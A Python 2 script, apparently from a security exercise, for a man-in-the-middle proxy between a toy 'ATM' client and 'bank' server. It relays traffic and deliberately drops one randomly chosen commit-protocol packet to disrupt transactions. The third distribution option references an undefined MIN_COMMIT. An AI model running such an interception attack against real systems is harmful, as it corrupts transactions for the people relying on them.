#!/usr/bin/env python2
import requests
import traceback
import random
import socket
import argparse
import threading
import signal
from contextlib import contextmanager
import time
import json
import sys
import struct
from threading import Semaphore
import subprocess
from random import randint

from Crypto.Random.random import StrongRandom
from numpy.random import geometric
from numpy.random import random_integers
import logging

logging.basicConfig(filename='output.log', level=logging.DEBUG)
logger = logging.getLogger(__name__)

DISTRIBUTION = 'U'
MAX_COMMIT = 1000

def recv(sock):
    data = ""
    try:
        while len(data) < 96:
            tmp = sock.recv(96 - len(data))
            if not tmp:
                return data
            data += tmp

        return data
    except socket.error:
        return data

def bank2atm(bank, atm):

    #handle hanshake
    atm.sendall(bank.recv(4096))

    #handle msg
    atm.sendall(bank.recv(4096))

    # commit protocol
    while True:
        b = recv(bank)
        if not b:
            break
        atm.sendall(b)
    return

def atm2bank(atm, bank):

    #handle hanshake
    bank.sendall(atm.recv(4096))

    #handle msg
    bank.sendall(atm.recv(4096))
    # which packet to drop?
    if DISTRIBUTION == 'G':
        commit_num = geometric(1 - pow(10.0, -3 / float(MAX_COMMIT)))
    elif DISTRIBUTION == 'U':
        commit_num = random_integers(MAX_COMMIT - 1)
    else:
        commit_num = StrongRandom().randint(MIN_COMMIT, MAX_COMMIT)

    # print "here"
    logger.info('[+] Nombre commits guessed: {0}'.format(commit_num))

    pck = 1
    # commit protocol
    while True:
        b = recv(atm)
        if not b:
            break

        if pck != commit_num:
            bank.sendall(b)
        else:
            logger.debug("Attacking!!!")
        pck += 1
    return

atm = None
bank = None
listen = None
running = True
def signalhandler(signal, handler):
    global running
    if atm:
        atm.close()
    if bank:
        bank.close()
    if listen:
        listen.close()
        running = False
    exit(0)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Proxy')
    parser.add_argument('-p', type=int, default=4000, help="listen port")
    parser.add_argument('-s', type=str, default="127.0.0.1", help="server ip address")
    parser.add_argument('-q', type=int, default=5000, help="server port")
    parser.add_argument('-c', type=int, default=1000, help="number of commits")
    parser.add_argument('-d', type=str, default='U', help="probability distribution (E, U, G)")
    args = parser.parse_args()

    DISTRIBUTION = args.d
    MAX_COMMIT = args.c

    logger.info('MITM Using distribution {0}'.format(DISTRIBUTION))

    signal.signal(signal.SIGINT, signalhandler)
    try:
        listen = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listen.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listen.bind(("0.0.0.0", args.p))
        listen.listen(5)

        while running == True:
            atm, a = listen.accept()
            bank = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            bank.connect((args.s, args.q))

            t1 = threading.Thread(target=atm2bank, args=(atm,bank))
            t1.start()
            t2 = threading.Thread(target=bank2atm, args=(bank,atm))
            t2.start()
            t1.join()
            t2.join()

            bank.close()
            atm.close()
    except Exception as e:
        print "Exception: {}".format(e)
        signalhandler(None, None)
    exit(0)
